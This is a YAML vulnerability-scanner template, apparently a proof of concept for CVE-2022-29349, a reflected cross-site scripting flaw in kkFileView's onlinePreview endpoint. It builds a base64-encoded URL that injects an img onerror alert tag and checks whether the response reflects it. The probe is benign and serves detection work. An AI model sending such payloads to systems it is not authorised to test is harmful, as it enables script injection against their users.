name: yaml-poc-keking-kkfileview-xss-CVE-2022-29349
binding: 793b2f30-c5f5-4023-8143-95a0ea5a8143
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-29349/
        - https://github.com/kekingcn/kkFileView/issues/347
    vulnerability:
        id: 8cc97d60-ddfc-4b8a-b8d9-d1af65a0bb5a
        level: medium
    warning: Harmless
transport: http
set:
    rand: randomInt(100000, 200000)
    payload: urlencode(base64('http://www.xxx.com/xxx.txt"><img src=111 onerror=alert(' + string(rand) + ")>123"))
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /onlinePreview?url={{payload}}
        expression: response.status == 200 && response.body.bcontains(bytes("<img src=111 onerror=alert(" + string(rand) + ")>123"))
expression: r0()
